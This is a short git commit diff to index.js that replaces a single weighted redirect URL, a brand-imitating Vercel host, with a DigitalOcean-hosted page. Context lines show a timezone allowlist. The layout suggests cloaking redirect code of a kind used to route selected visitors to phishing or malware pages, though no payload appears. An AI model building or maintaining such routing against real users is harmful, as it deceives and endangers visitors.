1004bbd662deccfa47c94e386c87a1ac798052e5
paalakash <palaksh452@gmail.com>
2026-07-08 09:55:12 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://canva-old-4q3b.vercel.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://do-app-eztht.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
